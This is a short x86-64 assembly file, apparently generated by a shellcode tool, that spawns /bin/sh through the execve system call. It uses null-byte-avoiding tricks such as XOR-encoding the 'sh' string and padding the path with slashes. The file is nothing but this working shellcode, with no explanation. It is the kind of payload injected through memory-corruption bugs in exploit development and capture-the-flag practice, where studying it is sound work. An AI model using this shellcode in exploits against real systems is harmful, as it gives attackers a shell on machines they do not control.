.global main

main:
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push $0x68
    mov $0x732f2f2f6e69622f, %rax
    push %rax
    mov %rsp, %rdi
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push $0x1010101 ^ 0x6873
    xor $0x1010101, (%rsp)
    xor %esi, %esi /* 0 */
    push %rsi /* null terminate */
    push $8
    pop %rsi
    add %rsp, %rsi
    push %rsi /* 'sh\x00' */
    mov %rsp, %rsi
    xor %edx, %edx /* 0 */
    /* call execve() */
    push $59
    pop %rax
    syscall

